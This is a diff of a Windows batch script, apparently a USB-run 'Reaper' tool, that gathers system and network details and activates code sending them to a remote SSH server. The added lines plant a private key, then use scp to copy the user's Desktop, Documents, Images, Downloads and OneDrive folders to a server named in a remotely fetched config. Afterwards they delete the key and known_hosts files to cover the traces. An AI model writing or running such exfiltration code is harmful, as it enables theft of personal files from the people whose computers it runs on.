@@ -97,17 +97,32 @@ for /f "usebackq tokens=1* delims== " %%a in (`curl -L "%configUrl%"`) do (
 :: Validate if all the required variables are set
 if not defined target_server (
     echo TARGET_SERVER is not set in the remote configuration file.
+    pause
     exit /b 1
 )
 if not defined target_port (
-    echo TARGET PORT is not set in the remote configuration file. will use default port 22
+    echo TARGET_PORT is not set in the remote configuration file. Using default port 22.
     set "target_port=22"  :: Set default port to 22 if not specified in the remote configuration
+    echo target port is set to %target_port% by defoult
+    pause
 )
-if not defined target_folder (
-    echo TARGET_FOLDER is not set in the remote configuration file.
+if not defined ssh-user (
+    echo SSH-USER is not set in the remote configuration file.
+    set "ssh-user=reaper"  :: Set default user to reaper if not specified in the remote configuration
+    echo ssh user is set to %ssh-user% by defoult
+    pause
+)
+if not defined ssh-pass (
+    echo SSH-PASS is not set in the remote configuration file.
+    pause
     exit /b 1
 )
-@echo off
+if not defined target_folder (
+    echo target_folder is not set in the remote configuration file.
+    set "target_folder=~/Reaper-info-retrieve/%USERNAME%/"  :: Set default folder to ~/Reaper-info-retrieve/%USERNAME%/ if not specified in the remote configuration
+    echo target folder is set to %target_folder% by defoult
+    pause
+)
 
 :: --------------------------------- Safety Checks Done --------------------------------- ::
 
@@ -123,6 +138,12 @@ echo Machine Name: %COMPUTERNAME% > %filename%
 echo Logged in Account Name: %USERNAME% >> %filename%
 :: Get time and date
 echo Time and Date: %TIME% %DATE% >> %filename%
+:: Get local IP address
+for /f "skip=1 tokens=2 delims=[]" %%a in ('ping %computername% -n 1 -4') do set localIP=%%a
+echo Local IP: %localIP% >> %filename%
+:: Get public IP address
+for /f "skip=1 tokens=2 delims=[]" %%a in ('nslookup myip.opendns.com. resolver1.opendns.com') do set publicIP=%%a
+echo Public IP: %publicIP% >> %filename%
 :: Get Windows version and build information
 ver >> %filename%
 :: Get CPU information
@@ -139,12 +160,6 @@ wmic desktopmonitor get Caption, ScreenWidth, ScreenHeight >> %filename%
 wmic path Win32_PnPEntity where "Caption like '%%camera%%'" get Caption, DeviceID, Description, Manufacturer >> %filename%
 wmic path Win32_VideoController where "Caption like '%%camera%%'" get Caption, DeviceID, Description, Manufacturer >> %filename%
 wmic path CIM_VideoControllerResolution get HorizontalResolution, VerticalResolution >> %filename%
-:: Get local IP address
-for /f "skip=1 tokens=2 delims=[]" %%a in ('ping %computername% -n 1 -4') do set localIP=%%a
-echo Local IP: %localIP% >> %filename%
-:: Get public IP address
-for /f "skip=1 tokens=2 delims=[]" %%a in ('nslookup myip.opendns.com. resolver1.opendns.com') do set publicIP=%%a
-echo Public IP: %publicIP% >> %filename%
 :: Get list of installed apps
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | find "DisplayName" >> %filename%
 :: Get list of running processes
@@ -171,44 +186,38 @@ move %filename% "%dest_folder%\"
 
 echo Files copied successfully to USB (%usb_drive%)!
 
-:: ------------------------------------- SSH copy to server ------------------------------------- ::
+echo SSH-USER: %ssh-user%
+echo Target server:%target_server%
+echo Target port: %target_port%
+echo Target folder: %target_folder%
 
-:: uncomet lines with ":: #deactivated " to activate copying files to SSH server
-
-:: copy the private key to the users .ssh folder
-:: #deactivated xcopy /E /Y "%usb_drive%:\id_rsa" "%USERPROFILE%\.ssh\"
-:: Set target server
-:: #deactivated set target_server=[user]@[ip]
-:: Set target server port defoult 22
-:: #deactivated set target_port=22
-:: set path to target folder
-:: #deactivated set target_folder=Reaper-info-retreave/%USERNAME%/
-:: Send information to SSH server
-:: #deactivated ssh -p %target_port% %target_server% mkdir -p %target_folder%
-:: #deactivated scp -P %target_port%  %filename% %target_server%:%target_folder%
-:: #deactivated del %filename%
-
-:: #deactivated set /p CopyFiles="Do you want to copy the files to the SSH server? (y/n): "
+set /p CopyFiles="Do you want to copy the files to the SSH server? (y/n): "
 if /i "%CopyFiles%"=="y" (
-    ssh -p %target_port% %target_server% mkdir -p %target_folder%Desktop
-    scp -P %target_port% -r %desktop% %target_server%:%target_folder%Desktop
-    ssh -p %target_port% %target_server% mkdir -p %target_folder%Documents
-    scp -P %target_port% -r %documents% %target_server%:%target_folder%Documents
-    ssh -p %target_port% %target_server% mkdir -p %target_folder%Images
-    scp -P %target_port% -r %images% %target_server%:%target_folder%Images
-    ssh -p %target_port% %target_server% mkdir -p %target_folder%Downloads
-    scp -P %target_port% -r %downloads% %target_server%:%target_folder%/Downloads
-    ssh -p %target_port% %target_server% mkdir -p %target_folder%OneDrive
-    scp -P %target_port% -r %onedrive% %target_server%:%target_folder%OneDrive
+    :: -------------------------------------- SSH copy ssh key -------------------------------------- ::
+    xcopy /E /Y "%usb_drive%:\id_rsa" "%USERPROFILE%\.ssh\"
+    :: ---------------------------------- SSH copy host info server --------------------------------- ::
+    ssh -p %target_port% %ssh-user%@%target_server% mkdir -p %target_folder%
+    scp -P %target_port%  %filename% %ssh-user%@%target_server%:%target_folder%
+    :: ------------------------------------- SSH copy to server ------------------------------------- ::
+    ssh -p %target_port% %ssh-user%@%target_server% mkdir -p %target_folder%Desktop
+    scp -P %target_port% -r %desktop% %ssh-user%@%target_server%:%target_folder%Desktop
+    ssh -p %target_port% %ssh-user%@%target_server% mkdir -p %target_folder%Documents
+    scp -P %target_port% -r %documents% %ssh-user%@%target_server%:%target_folder%Documents
+    ssh -p %target_port% %ssh-user%@%target_server% mkdir -p %target_folder%Images
+    scp -P %target_port% -r %images% %ssh-user%@%target_server%:%target_folder%Images
+    ssh -p %target_port% %ssh-user%@%target_server% mkdir -p %target_folder%Downloads
+    scp -P %target_port% -r %downloads% %ssh-user%@%target_server%:%target_folder%/Downloads
+    ssh -p %target_port% %ssh-user%@%target_server% mkdir -p %target_folder%OneDrive
+    scp -P %target_port% -r %onedrive% %ssh-user%@%target_server%:%target_folder%OneDrive
     echo Files copied successfully!
+    :: ------------------------------------- Deleate SSH key ------------------------------------- ::
+    :: Delete the private key from the users .ssh folder        
+    del "%USERPROFILE%\.ssh\id_rsa"
+    del "%USERPROFILE%\.ssh\known_hosts"
+    del "%USERPROFILE%\.ssh\known_hosts.old"
 ) 
 if /i "%CopyFiles%"=="n" (
     echo Copying files to USB only.
 )
-
-:: Delete the private key from the users .ssh folder        
-:: #deactivated del "%USERPROFILE%\.ssh\id_rsa"
-:: #deactivated del "%USERPROFILE%\.ssh\known_hosts"
-:: #deactivated del "%USERPROFILE%\.ssh\known_hosts.old"
 
 pause
